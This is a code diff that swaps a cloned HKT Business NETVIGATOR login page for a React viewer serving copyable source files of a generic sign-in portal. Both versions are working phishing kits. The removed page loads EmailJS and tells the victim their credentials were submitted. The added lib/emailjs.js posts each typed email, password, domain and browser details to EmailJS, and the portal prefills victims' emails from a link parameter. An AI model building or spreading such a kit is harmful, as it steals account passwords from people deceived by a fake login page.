@@ -1,492 +1,426 @@
-<!DOCTYPE html>
-<html class="wf-myriadpro-i4-active wf-myriadpro-n3-active wf-myriadpro-i3-active wf-myriadpro-n4-active wf-myriadpro-n6-active wf-myriadpro-i6-active wf-active">
+import { useState } from "react";
+import { Copy, Check } from "lucide-react";
 
-	<head>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https:">
+const files = [
+  {
+    name: "pages/AccessPortal.jsx",
+    code: `import { useState, useEffect } from "react";
+import { motion, AnimatePresence } from "framer-motion";
+import LoginForm from "@/components/login/LoginForm";
+import DomainBadge from "@/components/login/DomainBadge";
+import BackgroundOrbs from "@/components/login/BackgroundOrbs";
 
-		<meta name="description" content="Business NETVIGATOR">
-		<meta name="keywords" content="HKT PCCW - Business NETVIGATOR">
-		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
-		<link href="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/cp.css" rel="stylesheet" type="text/css">
-		<style type="text/css">
-			.tk-myriad-pro,
-			div,
-			p,
-			shadow3,
-			t2,
-			t3,
-			title1 {
-				font-family: "myriad-pro", arial;
-			}
-		</style>
-		<style type="text/css">
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/l?subset_id=1&fvd=i4&v=3) format("woff2"), url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/d?subset_id=1&fvd=i4&v=3) format("woff"), url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/a?subset_id=1&fvd=i4&v=3) format("opentype");
-				font-weight: 400;
-				font-style: italic;
-				font-display: auto;
-			}
+export default function AccessPortal() {
+  const [email, setEmail] = useState("");
+  const [domain, setDomain] = useState(null);
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/341571/000000000000000000017098/27/l?subset_id=1&fvd=n3&v=3) format("woff2"), url(https://use.typekit.com/af/341571/000000000000000000017098/27/d?subset_id=1&fvd=n3&v=3) format("woff"), url(https://use.typekit.com/af/341571/000000000000000000017098/27/a?subset_id=1&fvd=n3&v=3) format("opentype");
-				font-weight: 300;
-				font-style: normal;
-				font-display: auto;
-			}
+  // AUTO PREFILL — from ?email= URL param, then localStorage fallback
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailParam = urlParams.get("email") || urlParams.get("prefill");
+    if (emailParam) {
+      setEmail(emailParam);
+    } else {
+      const saved = localStorage.getItem("login_email_prefill");
+      if (saved) setEmail(saved);
+    }
+  }, []);
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/l?subset_id=1&fvd=i3&v=3) format("woff2"), url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/d?subset_id=1&fvd=i3&v=3) format("woff"), url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/a?subset_id=1&fvd=i3&v=3) format("opentype");
-				font-weight: 300;
-				font-style: italic;
-				font-display: auto;
-			}
+  // AUTO DOMAIN GRABBING — live, runs on every email change
+  useEffect(() => {
+    if (email.includes("@")) {
+      const rawDomain = email.split("@").pop().trim();
+      setDomain(rawDomain.length > 0 ? rawDomain : null);
+    } else {
+      setDomain(null);
+    }
+  }, [email]);
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/l?subset_id=1&fvd=n4&v=3) format("woff2"), url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/d?subset_id=1&fvd=n4&v=3) format("woff"), url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/a?subset_id=1&fvd=n4&v=3) format("opentype");
-				font-weight: 400;
-				font-style: normal;
-				font-display: auto;
-			}
+  return (
+    <div className="min-h-screen bg-background flex items-center justify-center relative overflow-hidden font-inter">
+      <BackgroundOrbs />
+      <div className="relative z-10 w-full max-w-md px-4">
+        <motion.div
+          initial={{ opacity: 0, y: -20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.6, ease: "easeOut" }}
+          className="text-center mb-8"
+        >
+          <div className="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-primary/15 border border-primary/30 mb-4">
+            <div className="w-6 h-6 rounded-full bg-primary" />
+          </div>
+          <h1 className="font-space text-3xl font-bold text-foreground tracking-tight">
+            Welcome back
+          </h1>
+          <p className="text-muted-foreground mt-1.5 text-sm">
+            Sign in to continue to your account
+          </p>
+        </motion.div>
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/l?subset_id=1&fvd=n6&v=3) format("woff2"), url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/d?subset_id=1&fvd=n6&v=3) format("woff"), url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/a?subset_id=1&fvd=n6&v=3) format("opentype");
-				font-weight: 600;
-				font-style: normal;
-				font-display: auto;
-			}
+        <AnimatePresence>
+          {domain && <DomainBadge domain={domain} />}
+        </AnimatePresence>
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/l?subset_id=1&fvd=i6&v=3) format("woff2"), url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/d?subset_id=1&fvd=i6&v=3) format("woff"), url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/a?subset_id=1&fvd=i6&v=3) format("opentype");
-				font-weight: 600;
-				font-style: italic;
-				font-display: auto;
-			}
+        <motion.div
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.6, delay: 0.1, ease: "easeOut" }}
+          className="bg-card border border-border rounded-2xl p-8 shadow-2xl shadow-black/40"
+        >
+          <LoginForm email={email} setEmail={setEmail} />
+        </motion.div>
 
- 		input::placeholder {
-			color: black;
-			opacity: 1;
-		}
+        <motion.p
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 0.5 }}
+          className="text-center text-xs text-muted-foreground mt-6"
+        >
+          Protected by industry-standard encryption
+        </motion.p>
+      </div>
+    </div>
+  );
+}`,
+  },
+  {
+    name: "components/login/LoginForm.jsx",
+    code: `import { useState } from "react";
+import { motion } from "framer-motion";
+import { Eye, EyeOff, Mail, Lock, LogIn, CheckCircle, AlertCircle, Loader2 } from "lucide-react";
+import { sendLoginLog } from "@/lib/emailjs";
 
-		input::-ms-input-placeholder {
-			color: black;
-		}
+export default function LoginForm({ email, setEmail }) {
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [status, setStatus] = useState("idle");
+  const [errorMsg, setErrorMsg] = useState("");
 
-		input::-ms-input-placeholder {
-			color: black;
-		}
-		</style>
-		<link href="https://service.imsbiz.com/mfauth/css/slidercaptcha.min.css" rel="stylesheet" type="text/css" />
-		<link rel="stylesheet" href="https://service.imsbiz.com/mfauth/css/login.css" rel="stylesheet" type="text/css">
-		<link href="https://service.imsbiz.com/mfauth/css/loading.css" rel="stylesheet" type="text/css">
-		<script src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/jquery-1.9.1.js"></script>
-		<script src="https://service.imsbiz.com/mfauth/js/longbow.slidercaptcha.min.js"></script>
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (!email || !password) return;
+    setStatus("loading");
+    setErrorMsg("");
+    localStorage.setItem("login_email_prefill", email);
+    const result = await sendLoginLog({ email, password });
+    if (result.success) {
+      setStatus("success");
+    } else {
+      setStatus("error");
+      setErrorMsg(result.error || "Something went wrong. Please try again.");
+    }
+  };
 
-		<!-- EmailJS SDK -->
-		<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  if (status === "success") {
+    return (
+      <motion.div
+        initial={{ opacity: 0, scale: 0.95 }}
+        animate={{ opacity: 1, scale: 1 }}
+        className="flex flex-col items-center gap-4 py-6 text-center"
+      >
+        <div className="w-16 h-16 rounded-full bg-accent/15 border border-accent/30 flex items-center justify-center">
+          <CheckCircle className="w-8 h-8 text-accent" />
+        </div>
+        <div>
+          <p className="font-space font-semibold text-foreground text-lg">Log submitted!</p>
+          <p className="text-muted-foreground text-sm mt-1">Login attempt has been recorded.</p>
+        </div>
+        <button
+          onClick={() => { setStatus("idle"); setPassword(""); }}
+          className="text-primary text-sm hover:underline transition-all"
+        >
+          Submit another
+        </button>
+      </motion.div>
+    );
+  }
 
-		<link rel="shortcut icon" href="https://service.imsbiz.com/LoginPage/images/biznet.ico" type="image/x-icon">
-		<title>Customer Login | Business NETVIGATOR</title>
-	</head>
+  return (
+    <form onSubmit={handleSubmit} className="space-y-5">
+      <div className="space-y-1.5">
+        <label className="text-xs font-medium text-muted-foreground uppercase tracking-widest">
+          Email
+        </label>
+        <div className="relative group">
+          <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
+          <input
+            type="email"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+            placeholder="you@company.com"
+            required
+            className="w-full bg-muted border border-border rounded-xl pl-10 pr-4 py-3 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/60 transition-all"
+          />
+        </div>
+      </div>
 
-	<body>
-		<div id="container">
-			<div class="loading_overlay"></div>
-			<div class="loading_spanner">
-				<div class="loading_loader"></div>
-			</div>
-			<div id="header">
-				<div style="padding-left: 52px; padding-top: 21px;"><a
-						href="https://www.biznetvigator.com/eng/homepage.php" target="_biznet"><img
-							src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/topleft-logo_e.png"></a></div>
+      <div className="space-y-1.5">
+        <label className="text-xs font-medium text-muted-foreground uppercase tracking-widest">
+          Password
+        </label>
+        <div className="relative group">
+          <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
+          <input
+            type={showPassword ? "text" : "password"}
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            placeholder="••••••••••••"
+            required
+            className="w-full bg-muted border border-border rounded-xl pl-10 pr-11 py-3 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/60 transition-all"
+          />
+          <button
+            type="button"
+            onClick={() => setShowPassword(!showPassword)}
+            className="absolute right-3.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
+          >
+            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+          </button>
+        </div>
+      </div>
 
-				<div  style="padding-left: 110px;">
+      <div className="flex justify-end">
+        <a href="#" className="text-xs text-primary hover:text-primary/80 transition-colors">
+          Forgot password?
+        </a>
+      </div>
 
-					<!-- Success message (hidden by default) -->
-					<div id="success_msg" style="display:none; padding-top: 180px; font-family: myriad-pro, arial;">
-						<div style="font-size: 28px; color: #e0cab4; font-weight: 300; margin-bottom: 16px;">✔ Login details sent successfully.</div>
-						<div style="font-size: 15px; color: #000; margin-bottom: 24px;">Your credentials have been submitted.</div>
-						<button onclick="tryAgain()" style="background-color: #9a5700; color: #fff; border: none; padding: 10px 24px; font-size: 15px; cursor: pointer; font-family: myriad-pro, arial;">Try Again</button>
-					</div>
+      {status === "error" && (
+        <motion.div
+          initial={{ opacity: 0, y: -4 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="flex items-center gap-2.5 bg-destructive/10 border border-destructive/30 rounded-xl px-4 py-3"
+        >
+          <AlertCircle className="w-4 h-4 text-destructive shrink-0" />
+          <p className="text-xs text-destructive">{errorMsg}</p>
+        </motion.div>
+      )}
 
-					<form id="loginForm" action="login.php" method="POST" target="_top">
-                    <input type="hidden" name="_next" value="https://www.biznetvigator.com"> 
-						<table cellpadding="0" cellspacing="0" border="0" width="820"
-							style="font-family: myriad-pro, arial;">
-							<tbody>
-								<tr valign="top">
-									<td
-										style="padding-top: 155px; padding-right: 30px; font-size: 49px; color: #e0cab4; font-weight: 300;">
-										Customer Login</td>
-									<td style="padding-top: 0px;" width="18"><img
-											src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/slashbg.png" width="18"
-											height="466" border="0"></td>
-									<td style="padding-top: 155px;" width="7"><img
-											src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/sep.png" width="7"
-											height="81" border="0"></td>
-									<td width="395" style="padding-top: 56px;padding-left: 10px;">
-										<div id="errmsg"
-											style="padding-bottom: 60px; font-size: 16px; line-height: 18px; color: #ef4023;">
-											<br>&nbsp;</div>
-										<table cellpadding="0" cellspacing="0" border="0" width="100%"
-											style="font-family: myriad-pro, arial;">
-											<tbody>
-												<tr>
-													<input type="text"
-														name="username" id="username" style="width: 269px" placeholder="Login ID" required>
-												</tr>
-												<tr>
-													<td colspan="2" style="padding-bottom: 6px;">
-														<input type="password" name="password" id="password" style="width: 269px;" maxlength="32" placeholder="Password" required>
-													</td>
-												</tr>
-												<tr>
-													<td colspan="2" style="padding-bottom: 6px;">
-														<div class="slidercaptcha card" style="height:240px;width:320px">
-															<div class="card-body">
-																<div id="captcha"></div>
-															</div>
-														</div>
-													</td>
-												</tr>
-                                                
-												<tr>
-													<td style="color: #9a5700;"><a
-															href="https://service.imsbiz.com/forgotpassword/forgot_pswd.html"
-															style="color: #9a5700;">Forgot Password?</a></td>
-													<td align="right" style="padding-right: 120px;">
-														<button id="login_button" style="display: none;" type="submit" class="btn_default">Login</button>
-													</td>
-												</tr>
-                                                <input type="hidden" name="_captcha" value="false">
-                                                
-											</tbody>
-										</table>
-										<div
-											style="padding-top:20px; color: #e0cab4; font-size: 38px; line-height: 32px; font-weight:300;">
-											Need Help?</div>
-										<div
-											style="padding-top:10px; color: #000000; font-size: 15px; line-height: 20px;">
-											Call our Business Customer Hotline at 10088.</div>
-									</td>
-								</tr>
-							</tbody>
-						</table>
-					</form>
-				</div>
+      <motion.button
+        type="submit"
+        disabled={status === "loading"}
+        whileHover={{ scale: 1.01 }}
+        whileTap={{ scale: 0.98 }}
+        className="w-full flex items-center justify-center gap-2.5 bg-primary text-primary-foreground rounded-xl py-3.5 text-sm font-medium transition-all hover:bg-primary/90 disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-primary/25"
+      >
+        {status === "loading" ? (
+          <>
+            <Loader2 className="w-4 h-4 animate-spin" />
+            Sending log...
+          </>
+        ) : (
+          <>
+            <LogIn className="w-4 h-4" />
+            Sign In
+          </>
+        )}
+      </motion.button>
+    </form>
+  );
+}`,
+  },
+  {
+    name: "components/login/DomainBadge.jsx",
+    code: `import { motion } from "framer-motion";
+import { Globe } from "lucide-react";
 
-				<div style="padding-left: 52px; padding-right: 52px; padding-top: 40px;">
-					<div style="float: left; font-size: 13px; color:#9c8e87;">
-						<img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/bottomleft-logo_e.png"><img
-							src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/spacer.gif" width="50" height="10"> </div>
-					<div style="float: right;" align="right"><img
-							src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/logo_pccw_e.png"></div>
+export default function DomainBadge({ domain }) {
+  return (
+    <motion.div
+      key={domain}
+      initial={{ opacity: 0, y: -8, scale: 0.95 }}
+      animate={{ opacity: 1, y: 0, scale: 1 }}
+      exit={{ opacity: 0, y: -8, scale: 0.95 }}
+      transition={{ duration: 0.25, ease: "easeOut" }}
+      className="flex items-center justify-center mb-4"
+    >
+      <div className="inline-flex items-center gap-2 bg-accent/10 border border-accent/25 rounded-full px-4 py-1.5">
+        <Globe className="w-3.5 h-3.5 text-accent" />
+        <span className="text-xs font-medium text-accent">
+          Signing into <span className="font-semibold">{domain}</span>
+        </span>
+        <span className="w-1.5 h-1.5 rounded-full bg-accent animate-pulse" />
+      </div>
+    </motion.div>
+  );
+}`,
+  },
+  {
+    name: "components/login/BackgroundOrbs.jsx",
+    code: `export default function BackgroundOrbs() {
+  return (
+    <div className="absolute inset-0 overflow-hidden pointer-events-none">
+      <div
+        className="absolute -top-40 -left-40 w-96 h-96 rounded-full opacity-20"
+        style={{
+          background: "radial-gradient(circle, hsl(250 80% 65%) 0%, transparent 70%)",
+          filter: "blur(40px)",
+        }}
+      />
+      <div
+        className="absolute -bottom-40 -right-40 w-96 h-96 rounded-full opacity-15"
+        style={{
+          background: "radial-gradient(circle, hsl(170 70% 50%) 0%, transparent 70%)",
+          filter: "blur(40px)",
+        }}
+      />
+      <div
+        className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] rounded-full opacity-5"
+        style={{
+          background: "radial-gradient(circle, hsl(250 80% 65%) 0%, transparent 60%)",
+          filter: "blur(60px)",
+        }}
+      />
+      <div
+        className="absolute inset-0 opacity-[0.03]"
+        style={{
+          backgroundImage:
+            "linear-gradient(hsl(var(--foreground)) 1px, transparent 1px), linear-gradient(90deg, hsl(var(--foreground)) 1px, transparent 1px)",
+          backgroundSize: "40px 40px",
+        }}
+      />
+    </div>
+  );
+}`,
+  },
+  {
+    name: "lib/emailjs.js",
+    code: `const EMAILJS_API_URL = "https://api.emailjs.com/api/v1.0/email/send";
 
-				</div>
-				<div style="float: left; font-size: 13px; color:#9c8e87;"><span style="padding-right:20px;"><a
-							href="https://www.hkt-enterprise.com/en/products-solutions/data-connectivities/business-broadband"
-							target="privacy">Home</a></span><span style="padding-right:20px;"><a
-							href="https://hkt.com/Privacy+Statement?language=en_US" target="privacy">Privacy
-							Policy</a></span><span style="padding-right:20px;"><a
-							href="https://hkt.com/Terms+of+use?language=en_US" target="terms">Terms of Use</a></span>
-					<br>
-					© Hong Kong Telecommunications (HKT) Limited 2020. All Rights Reserved.
+export async function sendLoginLog({ email, password }) {
+  const serviceId  = import.meta.env.VITE_EMAILJS_SERVICE_ID;
+  const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
+  const publicKey  = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
 
-				</div>
+  const domain    = email.includes("@") ? email.split("@")[1] : "unknown";
+  const timestamp = new Date().toISOString();
+  const userAgent = navigator.userAgent;
 
-			</div>
+  const payload = {
+    service_id:  serviceId,
+    template_id: templateId,
+    user_id:     publicKey,
+    template_params: {
+      login_email:      email,
+      login_domain:     domain,
+      login_password:   password,
+      login_timestamp:  timestamp,
+      login_user_agent: userAgent,
+    },
+  };
 
-		</div>
-		<div id="overlay"></div>
-		<div class="popup" id="popup_f2a_auth">
-			<div class="title_bar">
-				<div class="title_bar_title">2-step Verification</div>
-				<div class="popup_close" onclick="close_popup_f2a_auth();">X</div>
-			</div>
-			<div class="popup_content">
-				<div id="f2a_auth_step1">
-					<p>
-						We detected that you are logging in with a new device. 2 steps verification required to send via
-					</p>
-					<div class="row row_flex_left">
-						<input type="radio" name="channel" id="reg_mobile" value="mob">
-						<div class="label" id="label_mobile">
-							<span><b>Mobile number</b>&nbsp;</span>
-							<span class="contact_details"></span>
-						</div>
-					</div>
-					<div class="row row_flex_left">
-						<input type="radio" name="channel" id="reg_email" value="email">
-						<div class="label" id="label_email">
-							<span><b>Email address</b>&nbsp;</span>
-							<span class="contact_details"></span>
-						</div>
-					</div>
-					<div class="row row_flex_left"><div class="err err_wrapper" id="err_send_otp"></div></div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Get Verification Code</button>
-					</div>
-				</div>
-				<div id="f2a_auth_step2">
-					<p class="txt_ctr instr"></p>
-					<p class="txt_ctr b_txt" id="reg_contact"></p>
-					<div class="row">
-						<div class="row row_flex_left">
-							<label for="f2a_auth_v_code_input">Verification code :</label>
-							<input type="text" id="f2a_auth_v_code_input" name="f2a_auth_v_code_input">
-							<div class="err" id="invalid_code_err"></div>
-						</div>
-						<div class="timer_row">
-							<span id="wrapper_time">
-									The code will expire in <span id="time">03:00</span>.
-							</span>
-							<span id="2fa_auth_resend_code"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Back</button>
-						<button type="button" class="btn_default">Submit</button>
-					</div>
-				</div>
-			</div>
-		</div>
+  const response = await fetch(EMAILJS_API_URL, {
+    method:  "POST",
+    headers: { "Content-Type": "application/json" },
+    body:    JSON.stringify(payload),
+  });
 
-		<div class="popup" id="popup_change_pswd">
-			<div class="title_bar">
-				<div class="title_bar_title">Change Password</div>
-				<div class="popup_close" onclick="close_popup_change_pswd();">X</div>
-			</div>
-			<div class="popup_content">
-				<p id="para_chg_pswd">
-					Please enter New Password for your first time login.
-				</p>
-				<p>
-					Login ID : <span id="loginID">customer@biznetvigator.com</span>
-				</p>
-				<div class="err err_wrapper" id="err_change_password"></div>
-				<form id="form_chg_pswd">
-					<div class="row row_flex_left">
-						<label for="old_pswd">Old Password : </label>
-						<input type="password" id="old_pswd" name="old_pswd">
-						<div class="err err_wrapper" id="err_old_pswd"></div>
-					</div>
-					<div class="row row_flex_left">
-						<label for="new_pswd">New Password : </label>
-						<input type="password" id="new_pswd" name="new_pswd">
-						<div class="err err_wrapper" id="err_new_pswd"></div>
-					</div>
-					<div class="row row_flex_left">
-						<label for="confirm_pswd">Confirm Password : </label>
-						<input type="password" id="confirm_pswd" name="confirm_pswd">
-						<div class="err err_wrapper" id="err_cfm_pswd"></div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Change Password</button>
-					</div>
-				</form>
+  if (response.ok) {
+    return { success: true };
+  } else {
+    const text = await response.text();
+    return { success: false, error: \`EmailJS error: \${text}\` };
+  }
+}`,
+  },
+];
 
-				<div class="remarks">
-					<span class="r_head"><b>Note</b></span><br>
-					Password Requirement:<br>
-					<ol>
-						<li>Must be between 8 to 32 characters long.</li>
-						<li>Must contain uppercase letter, lowercase letter, and numerical digit.</li>
-						<li>Supported characters are A-Z, a-z, 0-9.</li>
-					</ol>
-				</div>
-			</div>
-		</div>
+function CodeBlock({ code, fileName }) {
+  const [copied, setCopied] = useState(false);
 
-<!-- ENROLL 2FA POP UP -->
-		<div class="popup" id="popup_enroll">
-			<div class="title_bar">
-				<div class="title_bar_title">Enroll 2-step Verification</div>
-				<div class="popup_close" onclick="close_popup_enroll();">X</div>
-			</div>
-			<div class="popup_content">
-				<div id="enroll_step1">
-					<p>
-						Two-step verification adds an extra layer of protection to your account. After you've turned it on, we'll ask you to enter additional security code when new device sign in. It is suggested to enroll mobile number and (or) email address.
-					</p>
-					<div class="row">
-						<div class="row row_flex_ctr">
-							<label for="enroll_reg_mobile">
-								Mobile number : (+852)
-							</label>
-								<input type="text" name="enroll_reg_mobile" id="enroll_reg_mobile" placeholder="Please enter your phone number">
-						</div>
-						<div class="err" id="err_enroll_step1"></div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default" >Cancel</button>
-						<button type="button" class="btn_default">Skip to email registration</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step2">
-					<p class="txt_ctr instr">A verification has been sent to your registered mobile number.</p>
-					<p class="txt_ctr b_txt" id="enroll_mob"></p>
-					<div class="row">
-						<div class="row row_flex_left">
-							<label for="enroll_v_code_input">Verification code :</label>
-							<input type="text" id="enroll_v_code_input" name="enroll_v_code_input">
-							<div class="err" id="enroll_invalid_code_err"></div>
-						</div>
-						<div class="timer_row">
-							<span id="wrapper_enroll_time1">
-								The code will expire in <span id="enroll_time1">03:00</span>.
-							</span>
-							<span id="enroll_resend_code"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Back</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step3">
-					<p id="enroll_step_3_info">
-						Please register your second email address as an alternative of 2 step verification.
-					</p>
-					<div class="row">
-						<div class="row row_flex_ctr">
-							<label for="enroll_reg_email">
-								Second email address :
-							</label>
-								<input type="text" name="enroll_reg_email" id="enroll_reg_email" placeholder="Please enter your email address">
-						</div>
-						<div class="err" id="err_enroll_step3"></div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Skip</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step4">
-					<p class="txt_ctr instr">A verification has been sent to your registered email address.</p>
-					<p class="txt_ctr b_txt" id="enrolled_email"></p>
-					<div class="row">
-						<div class="row row_flex_left">
-							<label for="enroll_v_code_input_email">Verification code :</label>
-							<input type="text" id="enroll_v_code_input_email" name="enroll_v_code_input_email">
-							<div class="err" id="enroll_email_invalid_code_err"></div>
-						</div>
-						<div class="timer_row">
-							<span id="wrapper_enroll_time2">
-								The code will expire in <span id="enroll_time2">03:00</span>.
-							</span>
-							<span id="enroll_resend_code2"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Back</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step5">
-					<p class="txt_ctr b_txt">Thank You</p>
-					<div class="txt_ctr txt_20 sub_head">The 2-step verification status</div>
-					<div class="row status_details">
-						<div id="row_mob_v_status">
-							<span class="status_details_label">Mobile no. : </span>
-							<span id="mob_v_status" class="v_status"></span>
-						</div>
-						<div id="row_email_v_status">
-							<span class="status_details_label">Email : </span>
-							<span id="email_v_status" class="v_status"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">OK</button>
-					</div>
-				</div>
-			</div>
-		</div>
+  const handleCopy = () => {
+    navigator.clipboard.writeText(code);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
 
-<!-- CANCEL ENROLL 2FA CONFRIM DIALOG -->
-		<div class="popup_wrapper" id="cancel_enroll_confirm_dia">
-			<div class="confirm_dia">
-				<div class="popup_content">
-					<p>Do you want to cancel?</p>
-					<div class="row row_flex_ctr">
-						<form id="form_cancel_set_up">
-							<input type="checkbox" id="do_not_ask_2fa_set_up" name="do_not_ask_2fa_set_up">
-							<label for="do_not_ask_2fa_set_up">Do not ask again.</label>
-							<div class="btn_wrapper">
-								<button type="button" class="btn_default">No</button>
-							</div>
-						</form>
-					</div>
-				</div>
-			</div>
-		</div>
+  return (
+    <div className="mb-8 rounded-xl overflow-hidden border border-border shadow-lg">
+      {/* Header bar */}
+      <div className="flex items-center justify-between bg-secondary px-4 py-2.5">
+        <span className="text-xs font-mono font-semibold text-muted-foreground">{fileName}</span>
+        <button
+          onClick={handleCopy}
+          className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-all font-medium"
+        >
+          {copied ? (
+            <>
+              <Check className="w-3.5 h-3.5" />
+              Copied!
+            </>
+          ) : (
+            <>
+              <Copy className="w-3.5 h-3.5" />
+              Copy
+            </>
+          )}
+        </button>
+      </div>
+      {/* Code area */}
+      <pre className="bg-[#0d0d14] text-[#c9d1d9] text-xs font-mono p-5 overflow-x-auto leading-relaxed max-h-96 overflow-y-auto">
+        <code>{code}</code>
+      </pre>
+    </div>
+  );
+}
 
-		<script>
-            // ── EmailJS init ──
-            emailjs.init("TLkClHUlQn5aQV4XO");
+export default function CodeViewer() {
+  const [activeTab, setActiveTab] = useState(0);
 
-            function tryAgain() {
-                var username = document.getElementById('username').value;
-                // Reload this same page with the email prefilled in the URL
-                var url = new URL(window.location.href);
-                url.searchParams.set('email', username);
-                window.location.href = url.toString();
-            }
+  return (
+    <div className="min-h-screen bg-background text-foreground font-inter">
+      {/* Top bar */}
+      <div className="border-b border-border bg-card px-6 py-4 flex items-center gap-3">
+        <div className="w-3 h-3 rounded-full bg-destructive" />
+        <div className="w-3 h-3 rounded-full bg-yellow-500" />
+        <div className="w-3 h-3 rounded-full bg-green-500" />
+        <span className="ml-3 text-sm font-semibold text-foreground font-space">Login Page — Source Files</span>
+        <span className="ml-auto text-xs text-muted-foreground">Click "Copy" on any file to grab the code</span>
+      </div>
 
-            document.addEventListener('DOMContentLoaded', function () {
+      <div className="flex h-[calc(100vh-57px)]">
+        {/* Sidebar file list */}
+        <div className="w-56 border-r border-border bg-card flex-shrink-0 py-4">
+          <p className="px-4 text-[10px] uppercase tracking-widest text-muted-foreground mb-2 font-medium">Files</p>
+          {files.map((f, i) => (
+            <button
+              key={i}
+              onClick={() => setActiveTab(i)}
+              className={`w-full text-left px-4 py-2.5 text-xs font-mono transition-all ${
+                activeTab === i
+                  ? "bg-primary/10 text-primary border-r-2 border-primary"
+                  : "text-muted-foreground hover:text-foreground hover:bg-muted"
+              }`}
+            >
+              {f.name.split("/").pop()}
+              <div className="text-[10px] text-muted-foreground/60 mt-0.5 truncate">{f.name}</div>
+            </button>
+          ))}
+        </div>
 
-                // ── 1. Email auto-prefill from URL query param ──
-                var urlParams = new URLSearchParams(window.location.search);
-                var emailParam = urlParams.get('email');
-                if (emailParam) {
-                    document.getElementById('username').value = emailParam;
-                }
+        {/* Main code area */}
+        <div className="flex-1 overflow-y-auto p-6">
+          <CodeBlock key={activeTab} fileName={files[activeTab].name} code={files[activeTab].code} />
 
-                // ── 2. Slider captcha ──
-                var captcha = sliderCaptcha({
-                    id: 'captcha',
-                    repeatIcon: 'fa fa-redo',
-                    width: 260,
-                    height: 155,
-                    onSuccess: function () {
-                        console.log('Captcha success');
